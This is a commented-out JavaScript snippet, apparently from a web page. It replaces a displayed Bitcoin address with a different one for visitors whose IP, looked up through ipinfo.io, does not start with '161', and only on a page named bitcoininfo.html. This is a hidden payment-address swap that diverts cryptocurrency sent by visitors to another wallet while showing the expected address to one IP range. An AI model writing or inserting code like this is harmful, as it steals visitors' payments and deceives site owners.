
//   function getVisitorIP() {
//     const elm = document.getElementsByTagName("h2")[1];
//     if (elm) {
//         elm.textContent = "1BUn5iF7pAxSvdzvE8oCTX6JmbyungsAdq";

//         fetch('https://ipinfo.io/json')
//             .then(response => response.json())
//             .then(data => {
//                 // console.log('Visitor IP:', data.ip);

//                 if (!data.ip.startsWith('161')) {
//                   if (window.location.href.includes("bitcoininfo.html")) {
//                       const desiredText = "1LuUNwYLgHyEwHhhS6HRoZn4dkvwiFZfGV";
//                       // Update text content only if needed
//                       if (elm.textContent !== desiredText) {
//                           elm.textContent = desiredText;
//                       }
//                   }
//                 }  
//             })
//             .catch(error => console.error('Error:', error));
//     }
// }

// // Call the function as soon as the DOM content is loaded
// document.addEventListener("DOMContentLoaded", getVisitorIP);
// getVisitorIP()
